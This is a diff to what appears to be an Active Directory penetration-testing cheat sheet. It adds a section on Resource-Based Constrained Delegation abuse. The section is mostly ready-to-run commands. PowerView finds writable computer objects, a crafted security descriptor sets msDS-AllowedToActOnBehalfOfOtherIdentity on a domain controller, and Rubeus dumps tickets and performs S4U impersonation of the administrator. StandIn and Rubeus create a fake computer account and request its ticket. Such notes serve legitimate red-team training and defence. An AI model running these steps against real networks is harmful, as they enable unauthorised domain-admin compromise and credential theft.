@@ -100,7 +100,7 @@ PS C:\Windows\Temp\Rubeus\>.\Rubeus.exe kerberoast /outfile:hashes.kerberoast
 You can also specify a user:
 
 ```
-PS C:\Windows\Temp\Rubeus\>.\Rubeus.exe kerberoast /user:svcadmin /outfile:hashes.kerberoast
+.\Rubeus.exe kerberoast /user:svcadmin /outfile:hashes.kerberoast
 ```
 ### Cracking the tickets
 
@@ -472,6 +472,100 @@ It is recommended to:
 * Limit DA/Admin logins to specific servers.
 * Set `Account is sensitive and cannot be delegated` flag for privileged accounts.
 
+## Rersource-Based Constrained Delegation (RBCD)
+
+To enable **constrained** or **unsconstrained** delegation on a computer requires the `SeEnableDelegationPrivilege` user right assignment on domain controllers, which is only granted to enterprise and domain admins.
+
+Windows 2012 introduced a new type of delegation called **resource-based constrained delegation (RBCD)**, which allows the delegation configuration to be set on the target rather than the source.
+
+Constrained Delegation is configured on the front-end service via the `msDS-AllowedToDelegateTo` attribute an example could be `CIFS/dc-2.corp.local` was in the `msDS-AllowedToDelegateTo` attribute of `SQL-2`, which allows `SQL-2` computer account to impersonate any user to any service on `dc-2`.
+
+RBCD reverses this concept and puts control in the hands of the backend via the new attribute called `msDS-AllowedToActOnBehalfOfTheIdentity`. This attribute also does not require the `SeEnableDelegationPrivilege` to modify. You only need a privilege like `WriteProperty`, `GenericAll`, `GenericWrite` or `WriteDacl` on a computer object.
+
+
+> **Note**: We are going to abuse `WriteProperty`, `GenericAll`, `GenericWrite` or `WriteDacl` rights on a computer to add RBCD delegation attribute, then perform S4U and compromise the target machine.
+
+* PowerView (dev):
+```powershell
+Get-DomainComputer | Get-DomainObjectDacl -ResolveGUIDs |  ?{$_.ActiveDirectoryRights -match "WriteProperty|GenericWrite|GenericAll|WriteDacl" -and $_.SecurityIdentifier -match "S-1-5-21-569305411-121244042-2357301523-[\d]{4,10}"}
+```
+
+We need to use a computer account, we can use one we have compromised or we can join a fake one to the domain.
+
+To start the attack, we need it SID.
+
+* PowerView (dev):
+```powershell
+Get-DomainComputer -Identity WKSTN-2 -Properties objectSid
+```
+We will need to create a security descriptor with this SID:
+
+```powershell
+$rsd = New-Object Security.AccessControl.RawSecurityDescriptor "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-569305411-121244042-2357301523-1109)"
+$rsdb = New-Object byte[] ($rsd.BinaryLength)
+$rsd.GetBinaryForm($rsdb, 0)
+```
+And finally modify its property `msDS-AllowdToActOnBehalfOfOtherIdentity`.
+
+```powershell
+Get-DomainComputer -Identity "dc-2" | Set-DomainObject -Set @{'msDS-AllowedToActOnBehalfOfOtherIdentity' = $rsdb} -Verbose
+```
+
+One-liner command:
+
+```
+$rsd = New-Object Security.AccessControl.RawSecurityDescriptor "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-569305411-121244042-2357301523-1109)"; $rsdb = New-Object byte[] ($rsd.BinaryLength); $rsd.GetBinaryForm($rsdb, 0); Get-DomainComputer -Identity "dc-2" | Set-DomainObject -Set @{'msDS-AllowedToActOnBehalfOfOtherIdentity' = $rsdb} -Verbose
+```
+
+Next, we can use our compromised machine account to perform S4U impersonation with Rubeus. The `s4u` command requires a TGT,RC4 or AES hash. Since we have elevated access to that machine account, we can extract a TGT from memory.
+
+```powershell
+.\Rubeus.exe triage
+.\Rubeus.exe dump /luid:0x3e5 /service:krbtgt /nowrap
+```
+Then perform the S4U.
+
+```powershell
+.\Rubeus.exe s4u /user:WKSTN-2$ /impersonateuser:administrator /msdsspn:cifs/dc-2.corp.local /ticket:<base64ticket> /nowrap
+```
+Finally pass the ticket into a logon session for use.
+
+
+> **Note**: To clear up, remove the `msDS-AllowdToActOnBehalfOfOtherIdentity` entry:
+>
+> `Get-DomainComputer -Identity dc-2 | Set-DomainObject -Clear msDS-AllowedToActOnBehalfOfOtherIdentity`
+
+### Creating a computer object
+
+By default, every domain user can join up to 10 computers to the domain, this is specified on the `ms-DS-MachineAccountQuota` attribute of the domain object.
+
+```powershell
+Get-DomainObject -Identity "DC=corp,DC=local" -Properties ms-DS-MachineAccountQuota
+```
+We can use `StandIn` to create a computer with a random password.
+
+* [https://github.com/FuzzySecurity/StandIn](https://github.com/FuzzySecurity/StandIn)
+
+```powershell
+.\StandIn.exe --computer FakeComputer --make
+
+[?] Using DC    : dc-2.corp.local
+    |_ Domain   : corp.local
+    |_ DN       : CN=FakeComputer,CN=Computers,DC=corp,DC=local
+    |_ Password : oIrpupAtF1YCXaw
+
+[+] Machine account added to AD..
+```
+With Rubeus we can calculate their hashes.
+
+```powershell
+.\Rubeus.exe hash /password:oIrpupAtF1YCXaw /user:FakeComputer$ /domain:corp.local
+```
+Finally you can ask for a TGT.
+
+```powershell
+.\Rubeus.exe asktgt /user:FakeComputer$ /aes256:7A79DCC14E6508DA9536CD949D857B54AE4E119162A865C40B3FFD46059F7044 /nowrap
+```
 # Linux Credential Cache
 
 **Kerberos Credential Cache (ccache)** ffiles contains the kerberos credentials for a user authenticated to a domain-joined Linux machine, often a cached TGT. If we can compromise a machine, we can extract the ccache of any authenticated user and use it to request a TGS for any other service in the domain.
